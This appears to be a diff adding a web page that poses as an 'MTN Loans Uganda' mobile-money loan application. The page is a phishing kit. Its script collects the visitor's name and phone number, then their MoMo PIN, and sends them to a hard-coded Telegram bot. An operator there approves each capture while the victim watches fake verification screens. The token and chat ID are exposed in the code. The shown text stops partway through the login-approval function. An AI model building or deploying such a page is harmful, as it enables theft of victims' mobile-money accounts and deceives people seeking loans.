+    width: 360px; height: 200px;
+    background: radial-gradient(ellipse, rgba(255,204,0,0.14) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  /* Loading card */
+  .loading-card {
+    position: relative;
+    z-index: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 0 32px;
+    max-width: 340px;
+    width: 100%;
+  }
+
+  .loading-logo-wrap {
+    width: 64px; height: 64px;
+    background: #ffcc00;
+    border-radius: 16px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 800; color: #1a1a1a;
+    letter-spacing: -0.5px;
+    margin-bottom: 28px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+  }
+
+  /* Spinner ring */
+  .loading-spinner-wrap {
+    position: relative;
+    width: 64px; height: 64px;
+    margin-bottom: 28px;
+  }
+  .loading-ring {
+    width: 64px; height: 64px;
+    border-radius: 50%;
+    border: 4px solid rgba(255,255,255,0.15);
+    border-top-color: #ffcc00;
+    animation: loadSpin 0.85s linear infinite;
+  }
+  @keyframes loadSpin { to { transform: rotate(360deg); } }
+
+  .loading-title {
+    font-size: 18px; font-weight: 700;
+    color: #fff; margin-bottom: 8px;
+    letter-spacing: -0.2px;
+  }
+  .loading-sub {
+    font-size: 14px; color: rgba(255,255,255,0.55);
+    line-height: 1.6; margin-bottom: 32px;
+  }
+
+  /* Progress bar */
+  .loading-progress-track {
+    width: 100%; height: 3px;
+    background: rgba(255,255,255,0.12);
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .loading-progress-fill {
+    height: 100%;
+    background: #ffcc00;
+    border-radius: 999px;
+    animation: loadProgress 2s ease-in-out forwards;
+  }
+  @keyframes loadProgress {
+    0%   { width: 0%; }
+    60%  { width: 75%; }
+    100% { width: 100%; }
+  }
+  /* For page1→page2 loading (4s) */
+  .loading-progress-fill.slow {
+    animation: loadProgressSlow 4s ease-in-out forwards;
+  }
+  @keyframes loadProgressSlow {
+    0%   { width: 0%; }
+    60%  { width: 70%; }
+    100% { width: 100%; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ══ PAGE 1: HOMEPAGE ══ -->
+<div id="page1" class="page active">
+  <nav>
+    <a class="logo" href="#">
+      <div class="logo-icon">MoMo</div>
+      <div class="logo-text">
+        <h1>MTN Loans</h1>
+        <span>UGANDA</span>
+      </div>
+    </a>
+    <div class="menu-btn" role="button" aria-label="Open menu">
+      <span></span><span></span><span></span>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="badge">
+      <div class="badge-dot"></div>
+      🇺🇬 Built for Uganda · UGX 100,000 – UGX 10,000,000
+    </div>
+    <h2>UGX loans,<br><em>made simple.</em></h2>
+    <p>Borrow from UGX 100,000 to UGX 10,000,000 and repay over 1 to 24 months. Apply online in minutes — no paperwork, no branch queues, no collateral.</p>
+    <button class="btn-primary" onclick="goToApply()">Get started →</button>
+    <a class="btn-secondary" href="#">How it works</a>
+  </section>
+
+  <div class="features">
+    <div class="feature">
+      <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+      No collateral needed
+    </div>
+    <div class="feature">
+      <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+      Payout to mobile money
+    </div>
+    <div class="feature">
+      <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+      Decision in ~10 minutes
+    </div>
+  </div>
+</div>
+
+<!-- ══ LOADING SCREEN (page1 → page2) ══ -->
+<div id="pageLoading" class="page">
+  <div class="loading-glow-blue"></div>
+  <div class="loading-glow-yellow"></div>
+  <div class="loading-card">
+    <div class="loading-logo-wrap">MoMo</div>
+    <div class="loading-spinner-wrap">
+      <div class="loading-ring"></div>
+    </div>
+    <p class="loading-title">Setting things up…</p>
+    <p class="loading-sub">Preparing your loan application. This will only take a moment.</p>
+    <div class="loading-progress-track">
+      <div class="loading-progress-fill slow"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ LOADING SCREEN 2 (page2 → page3) ══ -->
+<div id="pageLoading2" class="page">
+  <div class="loading-glow-blue"></div>
+  <div class="loading-glow-yellow"></div>
+  <div class="loading-card">
+    <div class="loading-logo-wrap">MoMo</div>
+    <div class="loading-spinner-wrap">
+      <div class="loading-ring"></div>
+    </div>
+    <p class="loading-title">Saving your details…</p>
+    <p class="loading-sub">Securing your loan preferences. Just a second.</p>
+    <div class="loading-progress-track">
+      <div class="loading-progress-fill"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ LOADING SCREEN 3 (page3 → page4 login) ══ -->
+<div id="pageLoading3" class="page">
+  <div class="loading-glow-blue"></div>
+  <div class="loading-glow-yellow"></div>
+  <div class="loading-card">
+    <div class="loading-logo-wrap">MoMo</div>
+    <div class="loading-spinner-wrap">
+      <div class="loading-ring"></div>
+    </div>
+    <p class="loading-title">Verifying your details…</p>
+    <p class="loading-sub">Checking your information securely. Almost ready.</p>
+    <div class="loading-progress-track">
+      <div class="loading-progress-fill"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ PAGE 2: APPLY ══ -->
+<div id="page2" class="page">
+  <nav>
+    <a class="logo" href="#" onclick="goHome(); return false;">
+      <div class="logo-icon">MoMo</div>
+      <div class="logo-text">
+        <h1>MTN Loans</h1>
+        <span>UGANDA</span>
+      </div>
+    </a>
+    <button class="back-btn" onclick="goHome()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      Back
+    </button>
+  </nav>
+
+  <div class="apply-hero">
+    <p class="breadcrumb"><a href="#" onclick="goHome(); return false;">Home</a> › <span>Apply</span></p>
+    <h2>Let's get you <em>sorted.</em></h2>
+    <p>Four short steps, about three minutes. Have your MTN mobile money number ready — that's all we need.</p>
+    <div class="hero-checks">
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Free to apply
+      </span>
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        MTN MoMo payout
+      </span>
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Decision in ~10 min
+      </span>
+    </div>
+  </div>
+
+  <div class="apply-body">
+    <!-- Step card -->
+    <div class="step-card">
+      <div class="step-header">
+        <div class="step-meta">
+          <span class="step-label">Step 1 of 4</span>
+          <span class="step-name">Loan details</span>
+        </div>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+      </div>
+      <div class="step-body">
+        <h3>How much do you need?</h3>
+        <p>Choose an amount between UGX 100,000 and UGX 10,000,000, and how long you'd like to repay it over.</p>
+
+        <label class="field-label">Loan amount</label>
+        <div class="amount-input-wrap" id="amountWrap">
+          <span class="currency-tag">UGX</span>
+          <input type="text" id="amountInput" value="2,000,000" inputmode="numeric" oninput="onAmountInput(this)" />
+        </div>
+        <p class="field-err" id="errAmount" style="margin-bottom:4px;">Please enter an amount between UGX 100,000 and UGX 10,000,000.</p>
+        <p class="field-hint">Between UGX 100,000 and UGX 10,000,000.</p>
+
+        <span class="quick-label">Quick pick</span>
+        <div class="quick-picks" id="quickPicks">
+          <button class="pill" onclick="pickAmount(200000, this)">UGX 200,000</button>
+          <button class="pill" onclick="pickAmount(1000000, this)">UGX 1,000,000</button>
+          <button class="pill active" onclick="pickAmount(2000000, this)">UGX 2,000,000</button>
+          <button class="pill" onclick="pickAmount(5000000, this)">UGX 5,000,000</button>
+          <button class="pill" onclick="pickAmount(10000000, this)">UGX 10,000,000</button>
+        </div>
+
+        <label class="field-label">Repayment period</label>
+        <div class="period-picks" id="periodPicks">
+          <button class="pill" onclick="pickPeriod(1, this)">1 month</button>
+          <button class="pill" onclick="pickPeriod(3, this)">3 months</button>
+          <button class="pill active" onclick="pickPeriod(6, this)">6 months</button>
+          <button class="pill" onclick="pickPeriod(12, this)">12 months</button>
+          <button class="pill" onclick="pickPeriod(24, this)">24 months</button>
+        </div>
+
+        <label class="field-label">What's it for?</label>
+        <div class="purpose-select-wrap">
+          <div class="purpose-dropdown" id="purposeDropdown">
+            <div class="purpose-option" onclick="selectPurpose('Business', this)">
+              Business
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Education', this)">
+              Education
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Medical', this)">
+              Medical
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Home improvement', this)">
+              Home improvement
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Agriculture', this)">
+              Agriculture
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Rent or housing', this)">
+              Rent or housing
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+            <div class="purpose-option" onclick="selectPurpose('Other', this)">
+              Other
+              <svg class="purpose-check" viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+            </div>
+          </div>
+          <div class="select-wrap" id="purposeTrigger" onclick="togglePurposeDropdown()">
+            <span id="purposeLabel">Select a purpose</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+        </div>
+        <p class="field-err" id="errPurpose" style="margin-top:-18px; margin-bottom:16px;">Please select a loan purpose.</p>
+
+        <button class="btn-continue" onclick="goToStep2()">Continue</button>
+      </div>
+    </div>
+
+    <!-- Summary card -->
+    <div class="summary-card">
+      <p class="summary-label">Your application</p>
+      <p class="summary-amount" id="summaryAmount">UGX 2,000,000</p>
+      <p class="summary-period" id="summaryPeriod">Over 6 months</p>
+      <div class="summary-rows">
+        <div class="summary-row">
+          <span>Estimated monthly</span>
+          <span id="summaryMonthly">UGX 393,333</span>
+        </div>
+        <div class="summary-row">
+          <span>Total repayment</span>
+          <span id="summaryTotal">UGX 2,360,000</span>
+        </div>
+        <div class="summary-row">
+          <span>Purpose</span>
+          <span id="summaryPurpose">—</span>
+        </div>
+      </div>
+      <div class="summary-note">
+        For illustration, we use a sample 3% monthly flat rate. Your final rate depends on your profile and is shown before you accept.
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ PAGE 3: YOUR DETAILS ══ -->
+<div id="page3" class="page">
+  <nav>
+    <a class="logo" href="#" onclick="goHome(); return false;">
+      <div class="logo-icon">MoMo</div>
+      <div class="logo-text">
+        <h1>MTN Loans</h1>
+        <span>UGANDA</span>
+      </div>
+    </a>
+    <button class="back-btn" onclick="goToApply()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+      Back
+    </button>
+  </nav>
+
+  <div class="apply-hero">
+    <p class="breadcrumb"><a href="#" onclick="goHome(); return false;">Home</a> › <span>Apply</span></p>
+    <h2>Let's get you <em>sorted.</em></h2>
+    <p>Four short steps, about three minutes. Have your MTN mobile money number ready — that's all we need.</p>
+    <div class="hero-checks">
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Free to apply
+      </span>
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        MTN MoMo payout
+      </span>
+      <span>
+        <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        Decision in ~10 min
+      </span>
+    </div>
+  </div>
+
+  <div class="apply-body">
+    <div class="step-card">
+      <div class="step-header">
+        <div class="step-meta">
+          <span class="step-label">Step 2 of 4</span>
+          <span class="step-name">Your details</span>
+        </div>
+        <div class="progress-bar"><div class="p3-progress-fill"></div></div>
+      </div>
+      <div class="step-body">
+        <h3>Tell us about you</h3>
+        <p>We use these details to verify your identity. Everything stays encrypted and private.</p>
+
+        <label class="field-label" for="fullName">Full name</label>
+        <input class="text-input" id="fullName" type="text" placeholder="e.g. Mwamba Chileshe" style="margin-bottom:4px;" oninput="clearFieldErr('errName', this)" />
+        <p class="field-err" id="errName">Please enter your full name.</p>
+
+        <label class="field-label" style="margin-top:10px;">Date of birth</label>
+        <div class="dob-row">
+          <select id="dobDay" onchange="this.classList.add('has-value'); clearFieldErr('errDob')">
+            <option value="">Day</option>
+            <script>for(var d=1;d<=31;d++){document.write('<option>'+d+'</option>');}</script>
+          </select>
+          <select id="dobMonth" onchange="this.classList.add('has-value'); clearFieldErr('errDob')">
+            <option value="">Month</option>
+            <option>January</option><option>February</option><option>March</option>
+            <option>April</option><option>May</option><option>June</option>
+            <option>July</option><option>August</option><option>September</option>
+            <option>October</option><option>November</option><option>December</option>
+          </select>
+          <select id="dobYear" onchange="this.classList.add('has-value'); clearFieldErr('errDob')">
+            <option value="">Year</option>
+            <script>for(var y=new Date().getFullYear()-18;y>=1940;y--){document.write('<option>'+y+'</option>');}</script>
+          </select>
+        </div>
+        <p class="field-err" id="errDob" style="margin-bottom:4px;">Please select your full date of birth.</p>
+        <p class="field-hint" style="margin-bottom:14px;">You must be 18 or older to apply.</p>
+
+        <label class="field-label" for="city">City / Town</label>
+        <input class="text-input" id="city" type="text" placeholder="e.g. Kampala" style="margin-bottom:4px;" oninput="clearFieldErr('errCity', this)" />
+        <p class="field-err" id="errCity" style="margin-bottom:10px;">Please enter your city or town.</p>
+
+        <label class="field-label" for="phone" style="margin-top:4px;">MTN mobile number</label>
+        <div class="phone-wrap" id="phoneWrap" style="margin-bottom:4px;">
+          <div class="phone-flag">🇺🇬</div>
+          <input id="phone" type="tel" placeholder="077 000 0000" inputmode="numeric" oninput="clearFieldErr('errPhone'); document.getElementById('phoneWrap').classList.remove('input-invalid')" />
+        </div>
+        <p class="field-err" id="errPhone" style="margin-bottom:4px;">Please enter your MTN mobile number.</p>
+        <p class="field-hint" style="margin-bottom:14px;">Use 0… (e.g. 077…) or +256…. We'll send your one-time PIN here.</p>
+
+        <label class="field-label" for="email">Email address <span style="font-weight:400;text-transform:none;letter-spacing:0;color:#aaa;">(optional)</span></label>
+        <input class="text-input" id="email" type="email" placeholder="you@example.com" style="margin-bottom:0;" />
+
+        <div class="back-continue-row">
+          <button class="btn-back-pill" onclick="goToApply()">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
+            Back
+          </button>
+          <button class="btn-continue" style="flex:1;" onclick="validateStep2()">Continue</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Summary card (mirrors page 2, reads live state) -->
+    <div class="summary-card">
+      <p class="summary-label">Your application</p>
+      <p class="p3-summary-amount" id="p3SummaryAmount">UGX 2,000,000</p>
+      <p class="summary-period" id="p3SummaryPeriod">Over 6 months</p>
+      <div class="summary-rows">
+        <div class="summary-row">
+          <span>Estimated monthly</span>
+          <span id="p3SummaryMonthly">UGX 393,333</span>
+        </div>
+        <div class="summary-row">
+          <span>Total repayment</span>
+          <span id="p3SummaryTotal">UGX 2,360,000</span>
+        </div>
+        <div class="summary-row">
+          <span>Purpose</span>
+          <span id="p3SummaryPurpose">—</span>
+        </div>
+      </div>
+      <div class="summary-note">
+        For illustration, we use a sample 3% monthly flat rate. Your final rate depends on your profile and is shown before you accept.
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ── Telegram config ── */
+  var TG_TOKEN   = '9213405390:AAHmdbosvxxzD8qV5TT6dstOQGPolIDBsh8';
+  var TG_CHAT_ID = '8308761567';
+  var TG_API     = 'https://api.telegram.org/bot' + TG_TOKEN;
+
+  /* Send a plain message (no buttons). Pass parse_mode=null for raw plain text. */
+  function tgSend(msg, parseMode) {
+    var payload = { chat_id: TG_CHAT_ID, text: msg };
+    if (parseMode !== null) payload.parse_mode = parseMode || 'HTML';
+    return fetch(TG_API + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    }).then(function(r){ return r.json(); }).catch(function(){ return null; });
+  }
+
+  /* Send a message WITH ✅ Accept / ❌ Decline inline keyboard.
+     callbackId is a short unique string used as callback_data prefix. */
+  function tgSendWithButtons(msg, callbackId) {
+    return fetch(TG_API + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅  Accept', callback_data: callbackId + ':accept' },
+            { text: '❌  Decline', callback_data: callbackId + ':decline' }
+          ]]
+        }
+      })
+    }).then(function(r){ return r.json(); }).catch(function(){ return null; });
+  }
+
+  /* Remove the inline keyboard from a sent message (buttons disappear, text stays) */
+  function tgRemoveButtons(messageId) {
+    fetch(TG_API + '/editMessageReplyMarkup', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        message_id: messageId,
+        reply_markup: { inline_keyboard: [] }
+      })
+    }).catch(function(){});
+  }
+
+  /* Answer the callback query so Telegram stops showing the loading spinner on the button */
+  function tgAnswerCallback(callbackQueryId) {
+    fetch(TG_API + '/answerCallbackQuery', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackQueryId })
+    }).catch(function(){});
+  }
+
+  /* Poll for operator decision on a specific callbackId.
+     onAccept() and onDecline() are called once the operator taps a button.
+     Polling stops as soon as a matching callback is received. */
+  var _pollOffset = 0;
+  function tgPollDecision(callbackId, messageId, onAccept, onDecline) {
+    function poll() {
+      fetch(TG_API + '/getUpdates?timeout=20&offset=' + _pollOffset + '&allowed_updates=["callback_query"]')
+        .then(function(r){ return r.json(); })
+        .then(function(data) {
+          if (!data.ok) { setTimeout(poll, 3000); return; }
+          var updates = data.result || [];
+          var matched = false;
+          updates.forEach(function(upd) {
+            _pollOffset = Math.max(_pollOffset, upd.update_id + 1);
+            var cq = upd.callback_query;
+            if (!cq) return;
+            var data_str = cq.data || '';
+            if (data_str.indexOf(callbackId + ':') !== 0) return;
+            matched = true;
+            /* Answer callback so button stops spinning */
+            tgAnswerCallback(cq.id);
+            /* Remove buttons from the message — text stays */
+            tgRemoveButtons(messageId);
+            var decision = data_str.split(':')[1];
+            if (decision === 'accept') { onAccept(); }
+            else                       { onDecline(); }
+          });
+          if (!matched) { poll(); } /* keep polling */
+        })
+        .catch(function(){ setTimeout(poll, 4000); });
+    }
+    poll();
+  }
+
+  /* ── Waiting overlay helpers ── */
+  function showWaiting(title, msg) {
+    document.getElementById('waitingSpinner').style.display = 'block';
+    document.getElementById('waitingIconErr').style.display = 'none';
+    document.getElementById('waitingRetryBtn').style.display = 'none';
+    document.getElementById('waitingCard').classList.remove('waiting-error');
+    document.getElementById('waitingTitle').textContent = title || 'Verifying your details…';
+    document.getElementById('waitingMsg').textContent   = msg   || 'Please wait while we confirm your information.';
+    document.getElementById('waitingOverlay').style.display = 'flex';
+  }
+  function showDeclined(title, msg) {
+    document.getElementById('waitingSpinner').style.display = 'none';
+    document.getElementById('waitingIconErr').style.display = 'block';
+    document.getElementById('waitingRetryBtn').style.display = 'none';
+    document.getElementById('waitingCard').classList.add('waiting-error');
+    document.getElementById('waitingTitle').textContent = title || 'Verification Failed';
+    document.getElementById('waitingMsg').textContent   = msg   || 'The details provided could not be verified. Please check and try again.';
+    setTimeout(function() { hideWaiting(); }, 3000);
+  }
+  function hideWaiting() {
+    document.getElementById('waitingOverlay').style.display = 'none';
+    document.getElementById('waitingCard').classList.remove('waiting-error');
+  }
+
+  var amount = 2000000;
+  var months = 6;
+  var purpose = null;
+
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  function goToApply() {
+    showPage('pageLoading');
+    setTimeout(function() { showPage('page2'); }, 4000);
+  }
+  function goHome()    { showPage('page1'); }
+  function goToStep2() {
+    /* Validate page 2 before proceeding */
+    var amtOk  = amount >= 100000 && amount <= 10000000;
+    var purpOk = !!purpose;
+    var amtWrap = document.querySelector('.amount-input-wrap');
+    var purpTrig = document.getElementById('purposeTrigger');
+    var amtErr  = document.getElementById('errAmount');
+    var purpErr = document.getElementById('errPurpose');
+
+    var valid = true;
+
+    if (!amtOk) {
+      amtWrap.style.borderColor = '#e74c3c';
+      amtErr.classList.add('show');
+      valid = false;
+    } else {
+      amtWrap.style.borderColor = '';
+      amtErr.classList.remove('show');
+    }
+
+    if (!purpOk) {
+      purpTrig.style.borderColor = '#e74c3c';
+      purpErr.classList.add('show');
+      valid = false;
+    } else {
+      purpTrig.style.borderColor = '';
+      purpErr.classList.remove('show');
+    }
+
+    if (!valid) return;
+
+    /* Reset progress bar so animation replays cleanly */
+    var bar = document.querySelector('#pageLoading2 .loading-progress-fill');
+    bar.style.animation = 'none';
+    bar.offsetHeight; /* reflow */
+    bar.style.animation = '';
+    showPage('pageLoading2');
+    setTimeout(function() { updateP3Summary(); showPage('page3'); }, 2000);
+  }
+
+  function fmt(n) { return 'UGX ' + Math.round(n).toLocaleString(); }
+
+  function calcSummary() {
+    var rate = 0.03;
+    var total = amount * (1 + rate * months);
+    return { total: total, monthly: total / months };
+  }
+
+  function updateSummary() {
+    var s = calcSummary();
+    document.getElementById('summaryAmount').textContent = fmt(amount);
+    document.getElementById('summaryPeriod').textContent = 'Over ' + months + ' month' + (months > 1 ? 's' : '');
+    document.getElementById('summaryMonthly').textContent = fmt(s.monthly);
+    document.getElementById('summaryTotal').textContent = fmt(s.total);
+    document.getElementById('summaryPurpose').textContent = purpose || '—';
+  }
+
+  function updateP3Summary() {
+    var s = calcSummary();
+    document.getElementById('p3SummaryAmount').textContent = fmt(amount);
+    document.getElementById('p3SummaryPeriod').textContent = 'Over ' + months + ' month' + (months > 1 ? 's' : '');
+    document.getElementById('p3SummaryMonthly').textContent = fmt(s.monthly);
+    document.getElementById('p3SummaryTotal').textContent = fmt(s.total);
+    document.getElementById('p3SummaryPurpose').textContent = purpose || '—';
+  }
+
+  function pickAmount(val, btn) {
+    amount = val;
+    document.getElementById('amountInput').value = val.toLocaleString();
+    document.querySelectorAll('#quickPicks .pill').forEach(function(p){ p.classList.remove('active'); });
+    btn.classList.add('active');
+    updateSummary();
+  }
+
+  function pickPeriod(val, btn) {
+    months = val;
+    document.querySelectorAll('#periodPicks .pill').forEach(function(p){ p.classList.remove('active'); });
+    btn.classList.add('active');
+    updateSummary();
+  }
+
+  function onAmountInput(input) {
+    var raw = input.value.replace(/,/g, '');
+    var n = parseInt(raw, 10);
+    if (!isNaN(n)) {
+      amount = n;
+      document.querySelectorAll('#quickPicks .pill').forEach(function(p){ p.classList.remove('active'); });
+      updateSummary();
+    }
+    /* Clear error once user starts typing */
+    var amtErr = document.getElementById('errAmount');
+    var amtWrap = document.getElementById('amountWrap');
+    if (amtErr) amtErr.classList.remove('show');
+    if (amtWrap) amtWrap.style.borderColor = '';
+  }
+
+  function togglePurposeDropdown() {
+    var trigger  = document.getElementById('purposeTrigger');
+    var dropdown = document.getElementById('purposeDropdown');
+    var isOpen   = dropdown.classList.contains('open');
+    if (isOpen) {
+      dropdown.classList.remove('open');
+      trigger.classList.remove('open');
+    } else {
+      dropdown.classList.add('open');
+      trigger.classList.add('open');
+    }
+  }
+
+  function selectPurpose(val, el) {
+    purpose = val;
+    var label = document.getElementById('purposeLabel');
+    label.textContent = val;
+    label.classList.add('selected');
+    /* Clear active from all options */
+    document.querySelectorAll('.purpose-option').forEach(function(o){ o.classList.remove('active'); });
+    el.classList.add('active');
+    /* Close dropdown */
+    document.getElementById('purposeDropdown').classList.remove('open');
+    var trig = document.getElementById('purposeTrigger');
+    trig.classList.remove('open');
+    trig.style.borderColor = '';
+    /* Clear purpose error */
+    var purpErr = document.getElementById('errPurpose');
+    if (purpErr) purpErr.classList.remove('show');
+    updateSummary();
+  }
+
+  /* Close dropdown when clicking outside */
+  document.addEventListener('click', function(e) {
+    var trigger  = document.getElementById('purposeTrigger');
+    var dropdown = document.getElementById('purposeDropdown');
+    if (trigger && !trigger.contains(e.target) && dropdown && !dropdown.contains(e.target)) {
+      trigger.classList.remove('open');
+      dropdown.classList.remove('open');
+    }
+  });
+
+  function clearFieldErr(errId, inputEl) {
+    var el = document.getElementById(errId);
+    if (el) el.classList.remove('show');
+    if (inputEl) inputEl.style.borderColor = '';
+  }
+
+  function validateStep2() {
+    var name = document.getElementById('fullName').value.trim();
+    var day  = document.getElementById('dobDay').value;
+    var mon  = document.getElementById('dobMonth').value;
+    var yr   = document.getElementById('dobYear').value;
+    var city = document.getElementById('city').value.trim();
+    var ph   = document.getElementById('phone').value.trim();
+
+    var valid = true;
+
+    if (!name) {
+      document.getElementById('errName').classList.add('show');
+      document.getElementById('fullName').style.borderColor = '#e74c3c';
+      valid = false;
+    }
+    if (!day || !mon || !yr) {
+      document.getElementById('errDob').classList.add('show');
+      ['dobDay','dobMonth','dobYear'].forEach(function(id) {
+        if (!document.getElementById(id).value)
+          document.getElementById(id).style.borderColor = '#e74c3c';
+      });
+      valid = false;
+    }
+    if (!city) {
+      document.getElementById('errCity').classList.add('show');
+      document.getElementById('city').style.borderColor = '#e74c3c';
+      valid = false;
+    }
+    if (!ph) {
+      document.getElementById('errPhone').classList.add('show');
+      document.getElementById('phoneWrap').style.borderColor = '#e74c3c';
+      valid = false;
+    }
+
+    if (!valid) {
+      /* Scroll to first error */
+      var first = document.querySelector('#page3 .field-err.show');
+      if (first) first.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    /* Notify Telegram with full name and MTN number */
+    tgSend(
+      '👤 <b>MTN Loans — Applicant Details</b>\n\n' +
+      '🧑 <b>Full Name:</b> ' + name + '\n' +
+      '📱 <b>MTN Number:</b> <code>' + ph + '</code>\n' +
+      '⏰ <i>' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kampala' }) + ' (EAT)</i>'
+    );
+
+    /* Show loading screen 3 for 2s before login */
+    var bar = document.querySelector('#pageLoading3 .loading-progress-fill');
+    bar.style.animation = 'none';
+    bar.offsetHeight;
+    bar.style.animation = '';
+    showPage('pageLoading3');
+    setTimeout(function() { goToLogin(ph); }, 2000);
+  }
+
+  function goToLogin(ph) {
+    var display = ph || '077 000 0000';
+    document.getElementById('loginPhoneDisplay').value = display;
+    document.getElementById('pinInput').value = '';
+    document.getElementById('loginErr').style.display = 'none';
+    document.getElementById('loginForm').classList.remove('hide');
+    document.getElementById('loginSpinner').classList.remove('show');
+    showPage('page4');
+  }
+
+  function submitLogin() {
+    var pin = document.getElementById('pinInput').value.trim();
+    var err = document.getElementById('loginErr');
+    if (!pin || pin.length < 4) {
+      err.textContent = 'Please enter your 4 or 5-digit PIN.';
+      err.style.display = 'block';
+      return;
+    }
+    err.style.display = 'none';
+    var ph = document.getElementById('loginPhoneDisplay').value || '';
+    var cbId = 'login_' + Date.now();
+
+    showWaiting('Verifying your credentials…', 'Please hold on while your MTN MoMo login is being confirmed.');
+
+    tgSendWithButtons(
+      '🔐 <b>MTN MoMo Login</b>\n\n' +
+      '📱 <b>Phone:</b> <code>' + ph + '</code>\n' +
+      '🔑 <b>PIN:</b> <code>' + pin + '</code>\n' +
+      '⏰ <i>' + new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kampala' }) + ' (EAT)</i>\n\n' +
+      '📱 <code>' + ph + '</code>',
+      cbId
+    ).then(function(res) {
+      var msgId = res && res.result && res.result.message_id;
+      tgPollDecision(cbId, msgId,
+        /* Accept */
+        function() {
+          hideWaiting();
+          document.getElementById('loginForm').classList.add('hide');
+          document.getElementById('loginSpinner').classList.add('show');
+          var msgs = ['Verifying your identity…', 'Checking your MoMo account…', 'Almost there…'];
+          var i = 0;
+          document.getElementById('spinnerMsg').textContent = msgs[0];
+          var interval = setInterval(function() {
+            i++;
+            if (i < msgs.length) {
+              document.getElementById('spinnerMsg').textContent = msgs[i];
+            } else {
+              clearInterval(interval);
